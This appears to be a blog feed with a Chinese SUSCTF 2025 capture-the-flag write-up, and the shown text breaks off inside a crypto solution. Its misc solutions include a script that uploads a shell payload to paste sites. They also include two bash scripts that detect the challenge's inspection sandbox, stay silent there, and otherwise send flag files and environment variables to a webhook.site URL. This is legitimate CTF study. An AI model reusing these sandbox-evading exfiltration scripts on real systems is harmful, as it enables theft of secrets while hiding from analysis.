<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Matriy&#39;s blog</title>
  
  
  <link href="http://matriy330.github.io/atom.xml" rel="self"/>
  
  <link href="http://matriy330.github.io/"/>
  <updated>2025-10-19T11:36:57.655Z</updated>
  <id>http://matriy330.github.io/</id>
  
  <author>
    <name>Matriy</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>SUSCTF 2025 wp</title>
    <link href="http://matriy330.github.io/519e5256/"/>
    <id>http://matriy330.github.io/519e5256/</id>
    <published>2025-10-18T15:00:00.000Z</published>
    <updated>2025-10-19T11:36:57.655Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SUSCTF-wp"><a href="#SUSCTF-wp" class="headerlink" title="SUSCTF wp"></a>SUSCTF wp</h1><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251006220901737.png" alt="image-20251006220901737"></p><p>那几道逆向不太想复现了</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Questionnaire"><a href="#Questionnaire" class="headerlink" title="Questionnaire"></a>Questionnaire</h3><p>问卷</p><h3 id="easyjail"><a href="#easyjail" class="headerlink" title="easyjail"></a>easyjail</h3><p>AI直出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib.error</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">PAYLOAD = <span class="string">&quot;env -i PATH=/usr/bin:/bin sh -c &#x27;cat /flag&#x27;\n&quot;</span></span><br><span class="line">PRIMARY_ENDPOINT = <span class="string">&quot;https://0x0.st&quot;</span></span><br><span class="line">TMPFILES_ENDPOINT = <span class="string">&quot;https://tmpfiles.org/api/v1/upload&quot;</span></span><br><span class="line">PASTERS_ENDPOINT = <span class="string">&quot;https://paste.rs&quot;</span></span><br><span class="line">PIPFI_ENDPOINT = <span class="string">&quot;https://p.ip.fi&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_multipart_request</span>(<span class="params">url: <span class="built_in">str</span>, field_name: <span class="built_in">str</span>, filename: <span class="built_in">str</span>, content: <span class="built_in">str</span></span>) -&gt; urllib.request.Request:</span><br><span class="line">    boundary = <span class="string">&quot;----ctf&quot;</span> + secrets.token_hex(<span class="number">8</span>)</span><br><span class="line">    body = []</span><br><span class="line">    body.append(<span class="string">f&quot;--<span class="subst">&#123;boundary&#125;</span>\r\n&quot;</span>.encode())</span><br><span class="line">    body.append(</span><br><span class="line">        <span class="string">f&quot;Content-Disposition: form-data; name=\&quot;<span class="subst">&#123;field_name&#125;</span>\&quot;; filename=\&quot;<span class="subst">&#123;filename&#125;</span>\&quot;\r\n&quot;</span>.encode()</span><br><span class="line">    )</span><br><span class="line">    body.append(<span class="string">b&quot;Content-Type: text/plain\r\n\r\n&quot;</span>)</span><br><span class="line">    body.append(content.encode())</span><br><span class="line">    body.append(<span class="string">b&quot;\r\n&quot;</span>)</span><br><span class="line">    body.append(<span class="string">f&quot;--<span class="subst">&#123;boundary&#125;</span>--\r\n&quot;</span>.encode())</span><br><span class="line">    data = <span class="string">b&quot;&quot;</span>.join(body)</span><br><span class="line">    <span class="keyword">return</span> urllib.request.Request(</span><br><span class="line">        url,</span><br><span class="line">        data=data,</span><br><span class="line">        headers=&#123;</span><br><span class="line">            <span class="string">&quot;Content-Type&quot;</span>: <span class="string">f&quot;multipart/form-data; boundary=<span class="subst">&#123;boundary&#125;</span>&quot;</span>,</span><br><span class="line">            <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;ctf-solver&quot;</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">        method=<span class="string">&quot;POST&quot;</span>,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_0x0</span>(<span class="params">payload: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    request = _multipart_request(PRIMARY_ENDPOINT, <span class="string">&quot;file&quot;</span>, <span class="string">&quot;p.sh&quot;</span>, payload)</span><br><span class="line">    ctx = ssl.create_default_context()</span><br><span class="line">    <span class="keyword">with</span> urllib.request.urlopen(request, context=ctx, timeout=<span class="number">10</span>) <span class="keyword">as</span> response:</span><br><span class="line">        url = response.read().decode().strip()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url.startswith(<span class="string">&quot;http&quot;</span>):</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;0x0.st 返回异常：<span class="subst">&#123;url!r&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> url</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_tmpfiles</span>(<span class="params">payload: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    request = _multipart_request(TMPFILES_ENDPOINT, <span class="string">&quot;file&quot;</span>, <span class="string">&quot;p.sh&quot;</span>, payload)</span><br><span class="line">    ctx = ssl.create_default_context()</span><br><span class="line">    <span class="keyword">with</span> urllib.request.urlopen(request, context=ctx, timeout=<span class="number">10</span>) <span class="keyword">as</span> response:</span><br><span class="line">        data = response.read().decode().strip()</span><br><span class="line">    parsed = json.loads(data)</span><br><span class="line">    url = parsed[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;url&quot;</span>].replace(<span class="string">&quot;https://tmpfiles.org/&quot;</span>, <span class="string">&quot;https://tmpfiles.org/dl/&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url.startswith(<span class="string">&quot;http&quot;</span>):</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;tmpfiles 返回异常：<span class="subst">&#123;url!r&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> url</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_paste_rs</span>(<span class="params">payload: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    request = urllib.request.Request(</span><br><span class="line">        PASTERS_ENDPOINT,</span><br><span class="line">        data=payload.encode(),</span><br><span class="line">        headers=&#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;text/plain&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;ctf-solver&quot;</span>&#125;,</span><br><span class="line">        method=<span class="string">&quot;POST&quot;</span>,</span><br><span class="line">    )</span><br><span class="line">    ctx = ssl.create_default_context()</span><br><span class="line">    <span class="keyword">with</span> urllib.request.urlopen(request, context=ctx, timeout=<span class="number">10</span>) <span class="keyword">as</span> response:</span><br><span class="line">        url = response.read().decode().strip()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url.startswith(<span class="string">&quot;http&quot;</span>):</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;paste.rs 返回异常：<span class="subst">&#123;url!r&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> url</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_p_ip_fi</span>(<span class="params">payload: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    request = urllib.request.Request(</span><br><span class="line">        PIPFI_ENDPOINT,</span><br><span class="line">        data=payload.encode(),</span><br><span class="line">        headers=&#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;text/plain&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;ctf-solver&quot;</span>&#125;,</span><br><span class="line">        method=<span class="string">&quot;POST&quot;</span>,</span><br><span class="line">    )</span><br><span class="line">    ctx = ssl.create_default_context()</span><br><span class="line">    <span class="keyword">with</span> urllib.request.urlopen(request, context=ctx, timeout=<span class="number">10</span>) <span class="keyword">as</span> response:</span><br><span class="line">        url = response.read().decode().strip()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url.startswith(<span class="string">&quot;http&quot;</span>):</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;p.ip.fi 返回异常：<span class="subst">&#123;url!r&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> url</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">UPLOADERS = [</span><br><span class="line">    (<span class="string">&quot;0x0.st&quot;</span>, upload_0x0),</span><br><span class="line">    (<span class="string">&quot;tmpfiles&quot;</span>, upload_tmpfiles),</span><br><span class="line">    (<span class="string">&quot;paste.rs&quot;</span>, upload_paste_rs),</span><br><span class="line">    (<span class="string">&quot;p.ip.fi&quot;</span>, upload_p_ip_fi),</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_payload</span>(<span class="params">payload: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    last_error: Exception | <span class="literal">None</span> = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> name, uploader <span class="keyword">in</span> UPLOADERS:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            url = uploader(payload)</span><br><span class="line">        <span class="keyword">except</span> urllib.error.HTTPError <span class="keyword">as</span> err:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[!] <span class="subst">&#123;name&#125;</span> 上传失败：<span class="subst">&#123;err&#125;</span>&quot;</span>)</span><br><span class="line">            last_error = err</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> err:  <span class="comment"># noqa: BLE001</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[!] <span class="subst">&#123;name&#125;</span> 上传异常：<span class="subst">&#123;err&#125;</span>&quot;</span>)</span><br><span class="line">            last_error = err</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] <span class="subst">&#123;name&#125;</span> 上传成功&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> url</span><br><span class="line">    <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;所有上传方式均失败：<span class="subst">&#123;last_error&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">interact</span>(<span class="params">host: <span class="built_in">str</span>, port: <span class="built_in">int</span>, url: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">with</span> socket.create_connection((host, port), timeout=<span class="number">5</span>) <span class="keyword">as</span> sock:</span><br><span class="line">        sock_file = sock.makefile(<span class="string">&quot;rb&quot;</span>)</span><br><span class="line">        buffer = <span class="string">b&quot;&quot;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> buffer.endswith(<span class="string">b&quot;: &quot;</span>):</span><br><span class="line">            ch = sock_file.read(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> ch:</span><br><span class="line">                <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;远端提前关闭连接&quot;</span>)</span><br><span class="line">            buffer += ch</span><br><span class="line">        sys.stdout.write(buffer.decode(errors=<span class="string">&quot;ignore&quot;</span>))</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">        sock.sendall(url.encode() + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">        remaining = sock_file.read()</span><br><span class="line">        <span class="keyword">return</span> remaining.decode(errors=<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_flag</span>(<span class="params">output: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> output.splitlines():</span><br><span class="line">        <span class="keyword">if</span> line.startswith(<span class="string">&quot;Script stdout:&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> line.partition(<span class="string">&quot;:&quot;</span>)[<span class="number">2</span>].strip()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;SUSCTF misc 远程脚本沙箱解题脚本&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;host&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;题目主机&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;port&quot;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, <span class="built_in">help</span>=<span class="string">&quot;题目端口&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;--payload-url&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;直接指定已上传脚本的 URL&quot;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    payload_url = args.payload_url <span class="keyword">or</span> upload_payload(PAYLOAD)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] 使用脚本 URL: <span class="subst">&#123;payload_url&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    output = interact(args.host, args.port, payload_url)</span><br><span class="line">    <span class="built_in">print</span>(output)</span><br><span class="line"></span><br><span class="line">    flag = extract_flag(output)</span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] Flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] 输出中未找到 Flag，请确认脚本实际执行情况&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251005220720914.png" alt="image-20251005220720914"></p><h3 id="curlbash"><a href="#curlbash" class="headerlink" title="curlbash"></a>curlbash</h3><p>用了webhook和gist持久化一个文件链接</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># 用 webhook.site 探测网络：能连=非沙箱；不能=沙箱</span></span><br><span class="line"><span class="built_in">set</span> +e</span><br><span class="line">curl -sI --connect-timeout 2 <span class="string">&quot;https://webhook.site/2427af48-d862-4776-92fb-2fe7e93af250&quot;</span> | grep -q <span class="string">&quot;^HTTP/&quot;</span></span><br><span class="line"><span class="keyword">if</span> [ $? -eq 0 ]; <span class="keyword">then</span></span><br><span class="line">    netok=1</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    netok=0</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">set</span> -e</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$netok</span> -eq 1 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="comment"># ==== 非沙箱：收集并外带 flag ====</span></span><br><span class="line">    WEBHOOK=<span class="string">&quot;https://webhook.site/2427af48-d862-4776-92fb-2fe7e93af250&quot;</span></span><br><span class="line"></span><br><span class="line">    fl=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> [ -n <span class="string">&quot;<span class="variable">$FLAG</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">        fl=<span class="string">&quot;<span class="variable">$FLAG</span>&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> [ -f /flag ]; <span class="keyword">then</span></span><br><span class="line">        fl=<span class="string">&quot;<span class="subst">$(cat /flag)</span>&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> [ -f /flag.txt ]; <span class="keyword">then</span></span><br><span class="line">        fl=<span class="string">&quot;<span class="subst">$(cat /flag.txt)</span>&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> [ -f /app/flag ]; <span class="keyword">then</span></span><br><span class="line">        fl=<span class="string">&quot;<span class="subst">$(cat /app/flag)</span>&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        fl=<span class="string">&quot;Flag not found&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 避免 -e 因网络问题让脚本非0退出</span></span><br><span class="line">    <span class="built_in">set</span> +e</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 方式1：POST 正文（不使用 shell 重定向；用管道把stdin喂给 curl）</span></span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&#x27;%s&#x27;</span> <span class="string">&quot;<span class="variable">$fl</span>&quot;</span> | curl -fsS -X POST --data-binary @- <span class="string">&quot;<span class="variable">$WEBHOOK</span>?type=flag&quot;</span> -o /dev/null</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 方式2：再发一个简短 HEAD/GET 方便在面板里直观看到（依然不做 shell 重定向）</span></span><br><span class="line">    curl -fsS <span class="string">&quot;<span class="variable">$WEBHOOK</span>?ping=1&quot;</span> -o /dev/null</span><br><span class="line"></span><br><span class="line">    <span class="built_in">set</span> -e</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="comment"># ==== 沙箱：保持静默、无副作用 ====</span></span><br><span class="line">    :</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">s</span><br></pre></td></tr></table></figure><p>非预期出的</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251005232401456.png" alt="image-20251005232401456"></p><h3 id="curlbash-revenge"><a href="#curlbash-revenge" class="headerlink" title="curlbash-revenge"></a>curlbash-revenge</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"># 区分“文件执行”(沙箱轮) vs “stdin 执行”(最终 curl|bash)：</span><br><span class="line"># 在 bash 里，脚本通过文件运行时 $0 是脚本路径；</span><br><span class="line"># 通过 stdin 运行时，$0 通常是 bash/sh（例如 &quot;bash&quot; 或 &quot;-bash&quot;）。</span><br><span class="line"></span><br><span class="line">case &quot;$0&quot; in</span><br><span class="line">  bash|-bash|sh|-sh)</span><br><span class="line">    # ===== 最终轮：通过 stdin 被执行（curl | bash） =====</span><br><span class="line"></span><br><span class="line">    # 收集 flag（尽量覆盖常见位置/变量）</span><br><span class="line">    fl=&quot;&quot;</span><br><span class="line">    if [ -n &quot;$FLAG&quot; ]; then</span><br><span class="line">      fl=&quot;$FLAG&quot;</span><br><span class="line">    elif [ -f /flag ]; then</span><br><span class="line">      fl=&quot;$(cat /flag)&quot;</span><br><span class="line">    elif [ -f /flag.txt ]; then</span><br><span class="line">      fl=&quot;$(cat /flag.txt)&quot;</span><br><span class="line">    elif [ -f /app/flag ]; then</span><br><span class="line">      fl=&quot;$(cat /app/flag)&quot;</span><br><span class="line">    else</span><br><span class="line">      fl=&quot;Flag not found&quot;</span><br><span class="line">    fi</span><br><span class="line"></span><br><span class="line">    # 发到你的 webhook（不用 shell 重定向；网络失败也不让脚本非0退出）</span><br><span class="line">    WEBHOOK=&quot;https://webhook.site/2427af48-d862-4776-92fb-2fe7e93af250&quot;</span><br><span class="line">    printf &#x27;%s&#x27; &quot;$fl&quot; | curl -fsS -X POST --data-binary @- &quot;$WEBHOOK?type=flag&quot; -o /dev/null || :</span><br><span class="line">    curl -fsS &quot;$WEBHOOK?ping=1&quot; -o /dev/null || :</span><br><span class="line">    ;;</span><br><span class="line"></span><br><span class="line">  *)</span><br><span class="line">    # ===== 沙箱轮：脚本从文件运行，保持静默无副作用 =====</span><br><span class="line">    :</span><br><span class="line">    ;;</span><br><span class="line">esac</span><br><span class="line"></span><br><span class="line"># 明确成功退出</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251005232438914.png" alt="image-20251005232438914"></p><h3 id="eat-mian"><a href="#eat-mian" class="headerlink" title="eat-mian"></a>eat-mian</h3><p>做一下替换然后去在线网站测试下就行</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251006150525926.png" alt="image-20251006150525926"></p><p>susctf{Mag1Cal_P7epr0ces$er_087604c6048d}</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="03-CrySignin"><a href="#03-CrySignin" class="headerlink" title="03-CrySignin"></a>03-CrySignin</h3><p>GPT</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251005221049585.png" alt="image-20251005221049585"></p><h3 id="04-Broadcast-1"><a href="#04-Broadcast-1" class="headerlink" title="04-Broadcast_1"></a>04-Broadcast_1</h3><p>AI出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span 